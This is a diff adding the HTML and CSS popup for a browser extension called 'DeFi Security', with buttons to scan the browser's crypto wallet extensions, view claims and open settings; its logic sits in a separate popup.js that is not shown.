@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    body { width: 350px; padding: 20px; font-family: Arial; }
+    .status { padding: 10px; border-radius: 5px; margin: 10px 0; }
+    .safe { background: #d4edda; color: #155724; }
+    .warning { background: #fff3cd; color: #856404; }
+    .danger { background: #f8d7da; color: #721c24; }
+    button { width: 100%; padding: 12px; margin: 5px 0; cursor: pointer; border: none; border-radius: 8px; font-weight: bold; }
+    .scan-btn { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; font-size: 16px; }
+    .scan-btn:hover { opacity: 0.9; }
+    .secondary-btn { background: #6c757d; color: white; }
+    .wallet-list { margin: 15px 0; }
+    .wallet-item { background: #f8f9fa; padding: 12px; margin: 8px 0; border-radius: 8px; display: flex; align-items: center; gap: 10px; }
+    .wallet-icon { font-size: 24px; }
+    .wallet-info { flex: 1; }
+    .wallet-name { font-weight: bold; color: #333; }
+    .wallet-type { font-size: 12px; color: #666; }
+    #detected-wallets { display: none; }
+    #scan-results { display: none; margin-top: 15px; }
+    .loading { text-align: center; padding: 20px; }
+    .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #667eea; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <h3>🛡️ DeFi Security</h3>
+  <div id="status" class="status safe">Protected</div>
+  
+  <button id="scan-wallets" class="scan-btn">🔍 Scan Wallet Extensions</button>
+  
+  <div id="detected-wallets">
+    <h4 style="margin: 15px 0 10px 0;">Wallet Extension Detected!</h4>
+    <p style="color: #666; font-size: 13px; margin: 5px 0;">We detected <span id="wallet-count">0</span> wallet extension(s) in your browser</p>
+    
+    <div id="wallet-list" class="wallet-list"></div>
+    
+    <div style="background: #fff3cd; padding: 12px; border-radius: 8px; margin: 10px 0; font-size: 12px; color: #856404;">
+      <strong>💡 What we'll scan:</strong>
+      <ul style="margin: 8px 0 0 0; padding-left: 20px;">
+        <li>Extension permissions and access</li>
+        <li>Known malicious signatures</li>
+        <li>Suspicious activity patterns</li>
+      </ul>
+    </div>
+    
+    <button id="confirm-scan" class="scan-btn">✅ Yes, Scan It</button>
+    <button id="cancel-scan" class="secondary-btn">❌ Cancel</button>
+  </div>
+  
+  <div id="scanning" style="display: none;">
+    <div class="loading">
+      <div class="spinner"></div>
+      <p style="margin-top: 15px; color: #666;">Scanning wallets...</p>
+    </div>
+  </div>
+  
+  <div id="scan-results"></div>
+  
+  <button id="view-claims">View My Claims</button>
+  <button id="settings">Settings</button>
+  
+  <script src="popup.js"></script>
+</body>
+</html>
